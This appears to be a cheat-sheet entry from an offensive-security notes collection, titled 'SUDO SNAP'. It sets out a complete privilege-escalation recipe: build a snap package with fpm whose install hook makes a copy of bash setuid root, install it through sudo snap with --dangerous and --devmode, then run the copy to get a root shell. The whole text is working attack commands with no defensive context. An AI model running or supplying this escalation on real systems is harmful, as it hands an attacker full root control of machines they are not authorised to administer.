##### SUDO SNAP
```bash
target$ cp bash ~/
-------------------------
atacker $ COMMAND="chown root:root /home/user/bash; chmod 4777 /home/user/bash" 
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta

Created package {:path=>"xxxx_1.0_all.snap"}
-------------------------
UPLOAD FILE
-------------------------
target$ sudo snap install xxxx_1.0_all.snap --dangerous --devmode
target$ ./bash -p
-------------------------
YOU ARE ROOT
```